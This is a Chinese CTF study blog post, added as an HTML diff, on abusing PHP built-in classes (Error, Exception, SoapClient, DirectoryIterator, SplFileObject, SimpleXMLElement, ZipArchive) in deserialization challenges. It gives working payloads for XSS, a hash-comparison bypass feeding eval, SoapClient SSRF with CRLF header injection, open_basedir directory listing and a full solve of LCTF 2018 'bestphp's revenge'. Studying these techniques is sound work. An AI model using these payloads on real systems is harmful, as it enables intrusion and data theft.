@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="en" class="light">
+<head>
+  <meta charset="utf-8">
+  
+  <title>
+    
+    PHP原生类相关利用学习
+    
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml" />
+  <link rel="me" href="https://mas.uniiem.com/@mizore" />
+  
+<script src="https://cdn.staticfile.org/prism/1.17.1/prism.min.js"></script>
+
+  
+<script src="https://cdn.staticfile.org/prism/1.17.1/plugins/autoloader/prism-autoloader.min.js"></script>
+
+  
+<link rel="stylesheet" href="/css/prism/material-light.css">
+
+  
+<link rel="stylesheet" href="/css/prism/material-dark.css">
+
+  
+<script src="https://cdn.staticfile.org/prism/1.17.1/plugins/line-numbers/prism-line-numbers.min.js"></script>
+
+  
+<link rel="stylesheet" href="https://cdn.staticfile.org/prism/1.17.1/plugins/line-numbers/prism-line-numbers.min.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&family=Noto+Sans+SC:wght@300&display=swap.css">
+
+  
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Welcome to s4mmy's blog" type="application/atom+xml">
+</head>
+<script>
+  function setIsNight(isNight) {
+    localStorage.setItem('isNight', isNight)
+  }
+
+  function getIsNight() {
+    return localStorage.getItem('isNight')
+  }
+
+  function switchTheme() {
+    let isNight = getIsNight()
+    if (isNight === 'false') {
+      document.documentElement.className = 'dark'
+      document.getElementsByClassName('theme-switcher')[0].textContent = '🌙'
+      setIsNight('true')
+    } else {
+      document.documentElement.className = 'light'
+      document.getElementsByClassName('theme-switcher')[0].textContent = '🌞'
+      setIsNight('false')
+    }
+  }
+
+  let isNight = getIsNight()
+  if (isNight == null) {
+    isNight = 'false'
+    setIsNight('false')
+  }
+  if (isNight === 'false') {
+    document.documentElement.className = 'light'
+  } else {
+    document.documentElement.className = 'dark'
+  }
+</script>
+
+<body>
+  <div class="show-area">
+    <header>
+  <ul class="nav">
+    <li class="nav-child">
+      <a href="/">首页</a>
+    </li>
+    <li class="nav-child">
+      <a href="/categories">分类</a>
+    </li>
+    <li class="nav-child">
+      <a href="/tags">标签</a>
+    </li>
+    <li class="nav-child">
+      <a href="/about">关于</a>
+    </li>
+    <li class="nav-child">
+      <a href="/collection">收藏</a>
+    </li>
+    <li class="nav-child">
+      <a href="/board">留言</a>
+    </li>
+  </ul>
+  <div class="theme-switcher" onclick="switchTheme()">🌞</div>
+  <script>
+    if (isNight === 'false') {
+      document.getElementsByClassName('theme-switcher')[0].textContent = '🌞'
+    } else {
+      document.getElementsByClassName('theme-switcher')[0].textContent = '🌙'
+    }
+  </script>
+</header>
+    <main class="main-body">
+  <div class="toc-container">
+    <div class="toc-toggle">
+      <i id="toc-b-icon" class="iconfont icon-liebiao-01" onclick="toggleShow()"></i>
+    </div>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">PHP原生类相关利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Error%E5%86%85%E7%BD%AE%E7%B1%BB%E8%BF%9B%E8%A1%8C"><span class="toc-number">1.2.</span> <span class="toc-text">Error内置类进行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exception-%E5%86%85%E7%BD%AE%E7%B1%BB"><span class="toc-number">1.3.</span> <span class="toc-text">Exception 内置类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SoapClient-%E7%B1%BB"><span class="toc-number">1.4.</span> <span class="toc-text">SoapClient 类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DirectoryIterator-%E7%B1%BB"><span class="toc-number">1.5.</span> <span class="toc-text">DirectoryIterator 类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%AF%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E7%B1%BB"><span class="toc-number">1.5.1.</span> <span class="toc-text">可读取文件内容类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SimpleXMLElement%E7%B1%BB"><span class="toc-number">1.6.</span> <span class="toc-text">SimpleXMLElement类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ZipArchive-%E7%B1%BB"><span class="toc-number">1.7.</span> <span class="toc-text">ZipArchive 类</span></a></li></ol></li></ol>
+  </div>
+  
+  <script>
+    var show = false
+    function toggleShow() {
+      if (show) {
+        document.getElementsByClassName('toc')[0].className = 'toc'
+        document.getElementById('toc-b-icon').className = 'iconfont icon-liebiao-01'
+      } else {
+        document.getElementsByClassName('toc')[0].className = 'toc show'
+        document.getElementById('toc-b-icon').className = 'iconfont icon-quxiao-01'
+      }
+      show = !show
+    }
+    document.getElementsByClassName('toc')[0].onclick = toggleShow
+  </script>
+  
+  <div class="article-header">
+    <h1 class="article-title">PHP原生类相关利用学习</h1>
+    <div class="article-details">
+      <div class="article-post-date"><span>Posted at </span> 2023-07-25</div>
+      <div class="article-tags">
+        
+      </div>
+    </div>
+  </div>
+  <div class="article">
+  
+  <meta name="referrer" content="no-referrer" />
+
+<h2 id="PHP原生类相关利用"><a href="#PHP原生类相关利用" class="headerlink" title="PHP原生类相关利用"></a>PHP原生类相关利用</h2><p>第一次听到原生类是听一个师傅说的，没想到这么快就在做题的时候遇到了。</p>
+<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>PHP原生类是PHP的一些内置的类，可以直接调用。因为其包含一些魔术方法，所以可以在反序列化的时候利用。有时候，在题目中出现了反序列化，但是没有给出具体类，一般不是源码泄露再审计，就是利用php的原生类。</p>
+<p>常用的原生类有以下几个：</p>
+<ul>
+<li>Error</li>
+<li>Exception</li>
+<li>SoapClient</li>
+<li>DirectoryIterator</li>
+<li>SimpleXMLElement</li>
+</ul>
+<p>遍历PHP内置类的方法</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"> &lt;?php
+$classes &#x3D; get_declared_classes();
+foreach ($classes as $class) &#123;
+    $methods &#x3D; get_class_methods($class);
+    foreach ($methods as $method) &#123;
+        if (in_array($method, array(
+            &#39;__destruct&#39;,
+            &#39;__toString&#39;,
+            &#39;__wakeup&#39;,
+            &#39;__call&#39;,
+            &#39;__callStatic&#39;,
+            &#39;__get&#39;,
+            &#39;__set&#39;,
+            &#39;__isset&#39;,
+            &#39;__unset&#39;,
+            &#39;__invoke&#39;,
+            &#39;__set_state&#39;    &#x2F;&#x2F; 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类
+        ))) &#123;
+            print $class . &#39;::&#39; . $method . &quot;\n&quot;;
+        &#125;
+    &#125;
+&#125; 
+</code></pre>
+
+
+
+
+
+<h3 id="Error内置类进行"><a href="#Error内置类进行" class="headerlink" title="Error内置类进行"></a>Error内置类进行</h3><p>适用条件：</p>
+<ul>
+<li>适用于PHP7版本</li>
+<li>开启报错的情况下</li>
+</ul>
+<p>Error是php7的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 <code>__toString()</code> 的方法，这个方法将异常或者错误对象转换为字符串。</p>
+<p>常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，不如尝试利用这个来做一个xss，其实我看到的还是有好一些cms会选择直接使用 <code>echo &lt;Object&gt;</code> 的写法，当 PHP 对象被当作一个字符串输出或使用时候（如<code>echo</code>的时候）会触发<code>__toString</code> 方法，这是一种挖洞的新思路。</p>
+<p><strong>类属性（参数）：</strong></p>
+<ul>
+<li>message：错误消息内容</li>
+<li>code：错误代码</li>
+<li>file：抛出错误的文件名</li>
+<li>line：抛出错误在该文件中的行数</li>
+</ul>
+<p><strong>类方法：</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.construct.php"><code>Error::__construct</code></a> — 初始化 error 对象</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getmessage.php"><code>Error::getMessage</code></a> — 获取错误信息</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getprevious.php"><code>Error::getPrevious</code></a> — 返回先前的 Throwable</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getcode.php"><code>Error::getCode</code></a> — 获取错误代码</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getfile.php"><code>Error::getFile</code></a> — 获取错误发生时的文件</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getline.php"><code>Error::getLine</code></a> — 获取错误发生时的行号</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.gettrace.php"><code>Error::getTrace</code></a> — 获取调用栈（stack trace）</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.gettraceasstring.php"><code>Error::getTraceAsString</code></a> — 获取字符串形式的调用栈（stack trace）</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.tostring.php"><code>Error::__toString</code></a> — error 的字符串表达</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.clone.php"><code>Error::__clone</code></a> — 克隆 error</li>
+</ul>
+<p>触发XSS示例</p>
+<p>测试代码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+$a &#x3D; unserialize($_GET[&#39;whoami&#39;]);
+echo $a;
+?&gt;</code></pre>
+
+<p>可以看到这个测试代码的特点是有反序列化入口但是没给反序列化的类</p>
+<p>POC如下</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+$a&#x3D;new Error(&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;);
+$b&#x3D;serialize($a);
+echo urlencode($b);</code></pre>
+
+
+
+<p>利用Error错误输出的特点，在做题中可以用来绕过如md5，sha1等的比较</p>
+<p>例题</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">if( ($this-&gt;syc !&#x3D; $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) &#x3D;&#x3D;&#x3D; md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)&#x3D;&#x3D;&#x3D; sha1($this-&gt;lover)) )&#123;
+          if(!preg_match(&quot;&#x2F;\&lt;\?php|\(|\)|\&quot;|\&#39;&#x2F;&quot;, $this-&gt;syc, $match))&#123;
+              eval($this-&gt;syc);
+          &#125; else &#123;
+              die(&quot;Try Hard !!&quot;);
+          &#125;</code></pre>
+
+<p>这段代码可以使用数组绕过，但是使用数组无法进行后续的RCE</p>
+<p>测试代码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+ $a &#x3D; new Error(&#39;this is a test&#39;,1);
+ echo $a;</code></pre>
+
+<p>输出结果</p>
+<pre class="line-numbers language-none"><code class="language-none">Error: this is a test in &#x2F;box&#x2F;script.php:2
+Stack trace:
+#0 &#123;main&#125;</code></pre>
+
+<p>可以发现只输出了异常休息内容和塞在行数，并没有输出异常代码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+ $a &#x3D; new Error(&#39;this is a test&#39;,1);$b &#x3D; new Error(&#39;this is a test&#39;,2)
+ echo $a.PHP_EOL;
+ echo $b;</code></pre>
+
+<p>输出结果</p>
+<pre class="line-numbers language-none"><code class="language-none">Error: this is a test in &#x2F;box&#x2F;script.php:2
+Stack trace:
+#0 &#123;main&#125;
+Error: this is a test in &#x2F;box&#x2F;script.php:2
+Stack trace:
+#0 &#123;main&#125;
+</code></pre>
+
+<p>可以看到两个的输出是一样的，但是输入却不同，所以可以利用这个特性来绕过判断</p>
+<p>payload</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">$str &#x3D; &quot;?&gt;&lt;?&#x3D;include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;&#x2F;&#x2F;url取反绕过冒号过滤
+$a&#x3D;new Error($str,1);$b&#x3D;new Error($str,2);</code></pre>
+
+
+
+<h3 id="Exception-内置类"><a href="#Exception-内置类" class="headerlink" title="Exception 内置类"></a>Exception 内置类</h3><p>Exception内置类和Error内置类用法基本相同，区别在于Exception内置类适用于php5&#x2F;7版本。</p>
+<p><strong>类属性：</strong></p>
+<ul>
+<li>message：异常消息内容</li>
+<li>code：异常代码</li>
+<li>file：抛出异常的文件名</li>
+<li>line：抛出异常在该文件中的行号</li>
+</ul>
+<p><strong>类方法：</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.construct.php"><code>Exception::__construct</code></a> — 异常构造函数</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getmessage.php"><code>Exception::getMessage</code></a> — 获取异常消息内容</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getprevious.php"><code>Exception::getPrevious</code></a> — 返回异常链中的前一个异常</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getcode.php"><code>Exception::getCode</code></a> — 获取异常代码</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getfile.php"><code>Exception::getFile</code></a> — 创建异常时的程序文件名称</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getline.php"><code>Exception::getLine</code></a> — 获取创建的异常所在文件中的行号</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.gettrace.php"><code>Exception::getTrace</code></a> — 获取异常追踪信息</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.gettraceasstring.php"><code>Exception::getTraceAsString</code></a> — 获取字符串类型的异常追踪信息</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.tostring.php"><code>Exception::__toString</code></a> — 将异常对象转换为字符串</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.clone.php"><code>Exception::__clone</code></a> — 异常克隆</li>
+</ul>
+<h3 id="SoapClient-类"><a href="#SoapClient-类" class="headerlink" title="SoapClient 类"></a>SoapClient 类</h3><p>SoapClient类是PHP内置类中一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问web服务的PHP客户端。在做题时可用于SSRF</p>
+<p>类方法如下</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">SoapClient &#123;
+    &#x2F;* 方法 *&#x2F;
+    public __construct ( string|null $wsdl , array $options &#x3D; [] )
+    public __call ( string $name , array $args ) : mixed
+    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay &#x3D; false ) : string|null
+    public __getCookies ( ) : array
+    public __getFunctions ( ) : array|null
+    public __getLastRequest ( ) : string|null
+    public __getLastRequestHeaders ( ) : string|null
+    public __getLastResponse ( ) : string|null
+    public __getLastResponseHeaders ( ) : string|null
+    public __getTypes ( ) : array|null
+    public __setCookie ( string $name , string|null $value &#x3D; null ) : void
+    public __setLocation ( string $location &#x3D; &quot;&quot; ) : string|null
+    public __setSoapHeaders ( SoapHeader|array|null $headers &#x3D; null ) : bool
+    public __soapCall ( string $name , array $args , array|null $options &#x3D; null , SoapHeader|array|null $inputHeaders &#x3D; null , array &amp;$outputHeaders &#x3D; null ) : mixed
+&#125;</code></pre>
+
+<p>内置类中有一个<code>__call</code>方法，<code>__call</code>方法被触发后，它可以发送HTTP和HTTPS请求，正是这样它可以被利用到SSRF中。</p>
+<p>构造函数如下</p>
+<pre class="line-numbers language-none"><code class="language-none">public SoapClient :: SoapClient(mixed $wsdl [，array $options ])</code></pre>
+
+<ul>
+<li>第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。</li>
+<li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</li>
+</ul>
+<p>利用SoapClient进行SSRF示例</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+$a &#x3D; new SoapClient(null,array(&#39;location&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;IP_ADDR:PORT&#x2F;XXX&#39;,&#39;uri&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;IP_ADDR:PORT&#39;));
+$b&#x3D;serialize($a);
+echo $b;
+$c&#x3D;unserialize($b);
+$c-&gt;a(); &#x2F;&#x2F;调用不存在的方法触发__call()进行SSRF</code></pre>
+
+<p>但是，由于它仅限于HTTP&#x2F;HTTPS协议，所以用处不是很大。而如果这里HTTP头部还存在CRLF漏洞的话，但我们则可以通过SSRF+CRLF，插入任意的HTTP头。</p>
+<p>插入cookie示例</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+$target &#x3D; &#39;http:&#x2F;&#x2F;requestbin.net&#x2F;r&#x2F;doe3ps5d&#39;;
+$a &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target, &#39;user_agent&#39; &#x3D;&gt; &quot;WHOAMI\r\nCookie: PHPSESSID&#x3D;tcjr6nadpk3md7jbgioa6elfk4&quot;, &#39;uri&#39; &#x3D;&gt; &#39;test&#39;));
+$b &#x3D; serialize($a);
+echo $b;
+$c &#x3D; unserialize($b);
+$c-&gt;a();    &#x2F;&#x2F; 随便调用对象中不存在的方法, 触发__call方法进行ssrf
+?&gt;</code></pre>
+
+
+
+<p>例题</p>
+<p><strong>bestphp’s revenge</strong></p>
+<p>题目源码如下</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+highlight_file(__FILE__);
+$b &#x3D; &#39;implode&#39;;
+call_user_func($_GET[&#39;f&#39;], $_POST);
+session_start();
+if (isset($_GET[&#39;name&#39;])) &#123;
+    $_SESSION[&#39;name&#39;] &#x3D; $_GET[&#39;name&#39;];
+&#125;
+var_dump($_SESSION);
+$a &#x3D; array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);
+call_user_func($b, $a);
+?&gt; array(0) &#123; &#125;</code></pre>
+
+<p>使用dirsearch可扫出flag.php</p>
+<p>内容如下</p>
+<pre class="line-numbers language-none"><code class="language-none">only localhost can get flag!session_start();
+echo &#39;only localhost can get flag!&#39;; 
+$flag &#x3D; &#39;LCTF&#123;*************************&#125;&#39;; if($_SERVER[&quot;REMOTE_ADDR&quot;]&#x3D;&#x3D;&#x3D;&quot;127.0.0.1&quot;)
+&#123; $_SESSION[&#39;flag&#39;] &#x3D; $flag; &#125; 
+only localhost can get flag!</code></pre>
+
+<p>由<code>$_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;</code>可以推测这里需要通过内网进行访问。由此可以推断出这里需要使用SSRF。</p>
+<p>反观源码，有两个<code>call_user_func</code>可以使用可以调用任意函数。这里能想到的就是使用SoapClient类进行SSRF。但是要使用SoapClient进行SSRF的话需要反序列化触发SoapClient类里的<code>__call()</code>魔法函数。</p>
+<p> 问题是题目里并没有直接给出反序列化接口，但是由题目里的<code>session_start()</code>可以联想到这里要利用<code>session()</code>进行反序列化。</p>
+<p>先利用题目中的</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">if (isset($_GET[&#39;name&#39;])) &#123;
+    $_SESSION[&#39;name&#39;] &#x3D; $_GET[&#39;name&#39;];
+&#125;</code></pre>
+
+<p>写入序列化数据，再根据此处</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">var_dump($_SESSION);
+$a &#x3D; array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);
+call_user_func($b, $a);</code></pre>
+
+<p>利用<code>call_user_func</code>的特性可以调用不存在的函数触发SSRF从而将flag写入session中。最后通过<code>var_dump($_SESSION);</code>输出flag。</p>
+<p>这里第一步要先设置php的session序列化引擎</p>
+<blockquote>
+<p>但是如果想要利用session反序列化漏洞的话，我们必须要有 <code>ini_set()</code> 这个函数来更改 <code>session.serialize_handler</code> 的值，将session反序列化引擎修改为其他的引擎，本来应该使用ini_set()这个函数的，但是这个函数不接受数组，所以就不行了。于是我们就用<code>session_start()</code>函数来代替，即构造 session_start(serialize_handler&#x3D;php_serialize) 就行了。我们可以利用题目中的 <code>call_user_func($_GET[‘f’], $_POST);</code> 函数，传入<code>GET：/?f=session_start</code>、POST：<code>serialize_handler=php_serialize</code>，实现 session_start(serialize_handler&#x3D;php_serialize) 的调用来修改此页面的序列化引擎为php_serialize。</p>
+</blockquote>
+<p>先把session中的PHPSESSID记录下来</p>
+<p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049498.png" alt="image-20230719150003390"></p>
+<pre class="line-numbers language-module__htmlArea" data-language="module__htmlArea"><code class="language-module__htmlArea">n4caglsikk9fufk06mefhv4gv6</code></pre>
+
+<p>修改反序列化引擎，把需要反序列化的数据写入session</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+$a &#x3D; new SoapClient(null,array(&#39;location&#39;&#x3D;&gt;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php&quot;,&#39;user_agent&#39;&#x3D;&gt;&quot;s4mmy\r\nCookie: PHPSESSID&#x3D;n4caglsikk9fufk06mefhv4gv6\r\n&quot;,&#39;uri&#39;&#x3D;&gt;&quot;123&quot;));
+$b&#x3D;urlencode(serialize($a));
+echo &#39;|&#39;.$b;</code></pre>
+
+<p>这里我踩的了个小坑，像<code>\r\n</code>这种转义字符在PHP中要放在双引号中才能生效，我之前写的时候放在单引号内无法生效。。</p>
+<pre class="line-numbers language-none"><code class="language-none">|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A53%3A%22s4mmy%0D%0ACookie%3A+PHPSESSID%3Dn4caglsikk9fufk06mefhv4gv6%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</code></pre>
+
+<p>（不要忘记序列化数据区前面的竖杠）</p>
+<p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049671.png" alt="image-20230719150147210"></p>
+<p>接着只要刷新页面就能反序列化数据。但是还需以一步是触发<code>__call</code>方法。这里利用的是<code>call_user_func</code>的一个特性。当传入<code>call_user_func</code>的参数是一个数组时，可以用<code>call_user_func()</code>来调用一个类里面的方法，call_user_func()会将这个数组中的第一个值当做类名，第二个值当做方法名，所以就会调用<code>welcome_to_the_lctf2018</code>这个不存在的方法完成反序列化。至于<code>$b</code>就是用<code>extarct</code>函数进行变量覆盖。</p>
+<pre class="line-numbers language-none"><code class="language-none">?f&#x3D;extract
+
+POST
+b&#x3D;call_user_func</code></pre>
+
+<p>执行完成后只要带上之前保存的Cookie去访问页面就能获得flag</p>
+<p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049224.png" alt="image-20230719150301629"></p>
+<p>这里我在一开始做题时又反了毛病，就是写序列化数据在session处忘了带上了PHPSESSID</p>
+<h3 id="DirectoryIterator-类"><a href="#DirectoryIterator-类" class="headerlink" title="DirectoryIterator 类"></a>DirectoryIterator 类</h3><p>Directorylterator类属于PHP的原生文件操作类</p>
+<p>Directorylterator类提供了一个查看文件系统目录的简单接口，是PHP5的一个新增类。</p>
+<p><strong>Directorylterator与glob:&#x2F;&#x2F;协议结合可以无视open_basedir对目录的限制</strong>，可以用来列举出指定目录下的文件。</p>
+<p>测试代码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&#x2F;&#x2F; test.php
+&lt;?php
+$dir &#x3D; $_GET[&#39;whoami&#39;];
+$a &#x3D; new DirectoryIterator($dir);
+foreach($a as $f)&#123;
+    echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);&#x2F;&#x2F;如果想输出全部的文件名我们还需要对$dir对象进行遍历
+&#125;
+?&gt;&lt;?php
+$dir &#x3D; $_GET[&#39;whoami&#39;];
+$a &#x3D; new DirectoryIterator($dir);
+foreach($a as $f)&#123;
+    echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);&#x2F;&#x2F;如果想输出全部的文件名我们还需要对$dir对象进行遍历
+&#125;
+?&gt;</code></pre>
+
+<p>payload</p>
+<pre class="line-numbers language-none"><code class="language-none">?whoami&#x3D;glob:&#x2F;&#x2F;&#x2F;*</code></pre>
+
+<p>可以看到访问了phpstudy所在盘下根目录所有文件</p>
+<p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049096.png" alt="image-20230719162032861"></p>
+<blockquote>
+<p>但是会发现只能列根目录和open_basedir指定的目录的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容。</p>
+</blockquote>
+<p>glob协议适用通配符查询</p>
+<p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049258.png" alt="image-20230719162433774"></p>
+<p>其他文件操作类</p>
+<p>FilesystemIterator 类<br>FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。</p>
+<p>该类的使用方法与DirectoryIterator 类也是基本相同的：</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+$dir&#x3D;new FilesystemIterator(&quot;&#x2F;&quot;);
+echo $dir;</code></pre>
+
+
+
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+$dir&#x3D;new FilesystemIterator(&quot;&#x2F;&quot;);
+foreach($dir as $f)&#123;
+    echo($f.&#39;&lt;br&gt;&#39;);
+    &#x2F;&#x2F;echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);
+&#125;</code></pre>
+
+
+
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+$dir&#x3D;new FilesystemIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*php*&quot;);
+echo $dir;</code></pre>
+
+
+
+<p>GlobIterator 类</p>
+<p>由于使用 GlobIterator 类支持直接通过模式匹配来寻找文件路径，所以我们就不用在配合glob:&#x2F;&#x2F;协议了。</p>
+<p>测试代码：</p>
+<pre class="line-numbers language-none"><code class="language-none">代码：
+
+&lt;?php
+$dir &#x3D; $_GET[&#39;whoami&#39;];
+$a &#x3D; new GlobIterator($dir);
+foreach($a as $f)&#123;
+    echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);&#x2F;&#x2F; 不加__toString()也可,因为echo可以自动调用
+&#125;
+?&gt;
+
+# payload一句话的形式:
+$a &#x3D; new FilesystemIterator(&quot;&#x2F;*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);&#125;</code></pre>
+
+<h4 id="可读取文件内容类"><a href="#可读取文件内容类" class="headerlink" title="可读取文件内容类"></a>可读取文件内容类</h4><p>plFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等。</p>
+<p>该类的构造方法可以构造一个新的文件对象用于后续的读取。</p>
+<p>我们可以像类似下面这样去读取一个文件的一行：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+$context &#x3D; new SplFileObject(&#39;&#x2F;cachegrind.out.1004&#39;);
+echo $context;</code></pre>
+
+<p>但是这样也只能读取一行，要想全部读取的话还需要对文件中的每一行内容进行遍历：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+$context &#x3D; new SplFileObject(&#39;&#x2F;cachegrind.out.1004&#39;);
+foreach($context as $f)&#123;
+    echo($f);
+&#125;</code></pre>
+
+
+
+<h3 id="SimpleXMLElement类"><a href="#SimpleXMLElement类" class="headerlink" title="SimpleXMLElement类"></a>SimpleXMLElement类</h3><p>SimpleXMLElement这个内置类用于解析XML文档中的元素</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">public SimpleXMLElement::__construct(
+    string $data,
+    int $options &#x3D; 0,
+    bool $dataIsURL &#x3D; false,
+    string $namespaceOrPrefix &#x3D; &quot;&quot;,
+    bool $isPrefix &#x3D; false
+)</code></pre>
+
+<p><img src="/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8.assets/20210329180252-eccb96c2-9075-1.png"></p>
+<p>这里比较重要的是第三个参数，如果<code>data_is_url</code>设置为<code>true</code>那么可以实现远程xml文件的载入。第二个参数一般设置为2。第一个参数data可以设置为payliad的url地址用于进入外部实体url。或者xml文档字符串也可以。</p>
+<p>这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。</p>
+<h3 id="ZipArchive-类"><a href="#ZipArchive-类" class="headerlink" title="ZipArchive 类"></a>ZipArchive 类</h3><p>PHP ZipArchive类是PHP的一个原生类，它是在PHP 5.20之后引入的。ZipArchive类可以对文件进行压缩与解压缩处理</p>
+<p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049636.png" alt="image-20230725004824174"></p>
+<p>注意，如果设置flags参数的值为 ZipArchive::OVERWRITE 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE &#x3D; 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8。</p>
+
+</div>
+  <o3o key="mizore" api="https://o3o.mizore.site:2333"></o3o>
+  
+<script src="/o3o/o3o.js"></script>
+
+  
